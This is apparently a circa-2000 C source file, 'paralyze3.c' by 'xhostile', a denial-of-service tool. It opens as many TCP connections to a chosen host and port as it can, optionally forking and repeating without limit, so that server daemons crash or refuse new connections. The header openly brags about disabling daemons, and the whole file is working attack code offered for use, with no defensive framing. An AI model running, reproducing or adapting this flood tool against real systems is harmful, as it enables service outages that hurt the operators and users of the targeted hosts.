/*
 * paralyze3.c, by xhostile [3.8.00]
 *_
 * | This program will open as many connections to a remote
 * | host as supported (by both ends).
 * |
 * | Many daemons surprisingly either crash or stop allowing
 * | new connections while under attack from this program.
 * | This is (usually) simply because the daemon wasn't
 * | written to handle such a mass flood of connections, and
 * | in result, panicks and errors.
 * |
 * | Since it is usually hard/impossible to spoof full
 * | connections remotely, it should be known that this
 * | program does not hide identity in any way.
 * |
 * | If you rip any of this code give me credit for it.
 * |
 * +-----> ' 9 6 - 0 0  C y b e r - S t r i k e  j u a r 3 z
 *
 */

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>

#define MAX_DESC 250       // irrelevant when using the close option
#define TIMEOUT 7          // seconds
/* 1 = yes, 0 = no */
#define CLOSE 0
#define FORK 1

void err_hndlr(char *type);
void timeout(int sig);

void err_hndlr(char *type)
{
  if(FORK == 1) kill(getpid() +1, 9);
  printf("\nError (%s): ", type);
  fflush(stdout);
  perror("");
  exit(-1);
}

void timeout(int sig)
{
  if(FORK == 1) kill(getpid() +1, 9);
  puts("\nError (connect): Attempt to connect timed out");
  exit(-1);
}

int main(int argc, char *argv[])
{
  int sockdesc, conns, port, opt;
  int wait = 0, times = 0;
  char *host;
  struct hostent *buf;
  struct sockaddr_in sin;

  puts("paralyze v3 - leet daemon-disabling artillery, by xhostile");
  puts("----------------------------------------------------------");

  if(argc < 3 || argc > 7)
    {
      printf("Usage: %s <host> <port> [-w wait] [-t times]\n", argv[0]);
      exit(-1);
    }

  if((buf = gethostbyname(argv[1])) == NULL)
    {
      fprintf(stderr, "Error (resolve): %s is not a valid host\n", argv[1]);
      exit(-1);
    }

  host = argv[1];
  port = atoi(argv[2]);

  while((opt = getopt(argc, argv, "w:t:")) != -1)
    {
      switch(opt)
        {
        case 'w':
          wait = atoi(optarg);
          break;
        case 't':
          times = atoi(optarg);
          break;
        case '?':
          exit(-1);
        }

    }

  printf("Host....... %s\n", host);
  printf("Port....... %d\n", port);
  if(wait != 0)
    printf("Interval... %d\n", wait);
  else
    puts("Interval... fast as possible");
  if(times != 0)
    printf("Times...... %d\n", times);
  else
    puts("Times...... infinite");

  memcpy((caddr_t)&sin.sin_addr.s_addr, buf->h_addr, buf->h_length);
  sin.sin_family  = AF_INET;
  sin.sin_port = htons(port);

  printf("\nMaking connections (. = 15)");
  fflush(stdout);

  if(FORK == 1)
    if(fork() < 0) err_hndlr("fork");

  while(times == 0 || conns < times)
    {
      if((sockdesc = socket(AF_INET, SOCK_STREAM, 0)) < 0) err_hndlr("socket");

      signal(SIGALRM, timeout);
      alarm(TIMEOUT);

      if(CLOSE == 0 && MAX_DESC == conns)
        {
          if(FORK == 1) kill(getpid() +1, 9);
          printf("\nDescriptor limit (%d) reached\n", MAX_DESC);
          exit(0);
        }

      if(connect(sockdesc, (struct sockaddr *)&sin, sizeof(sin)) < 0) err_hndlr("connect");

      if(CLOSE == 1) close(sockdesc);
      if(wait != 0) sleep(wait);
      conns++;
      if(!((conns)%15)) printf(".");
      fflush(stdout);
    }

  if(FORK == 1) kill(getpid() +1, 9);
  printf("\nDone (%d connects)\n", times);
  exit(0);
}
/*                    www.hack.co.za              [2000]*/